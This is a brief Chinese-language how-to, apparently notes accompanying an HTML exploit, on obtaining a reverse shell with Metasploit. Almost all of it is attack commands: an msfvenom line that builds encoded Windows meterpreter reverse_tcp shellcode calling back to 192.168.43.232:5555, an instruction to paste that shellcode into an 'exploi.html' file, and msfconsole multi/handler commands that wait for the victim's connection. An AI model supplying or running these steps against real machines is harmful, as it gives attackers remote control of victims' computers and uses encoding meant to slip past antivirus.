### 利用msf反弹shell

#### msf反弹shell的shenllcode生成命令：

```msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.232 LPORT=5555 -e x86/shikata_ga_nai -b "\x00" -i 15 -f num -o payload.c```

**注意：LHOST要和自己本机ip保持一致，LPORT要和接下来监听的端口也保持一致**

将生成的payload.c文件中全部内容填入exploi.html中shellcode[]里。
#### msfconsole监听

执行命令：

```
msfconsole

msf6>use exploit/multi/handler

msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST 192.168.43.232

msf6 exploit(multi/handler) > set LPORT 5555

msf6 exploit(multi/handler) > run

```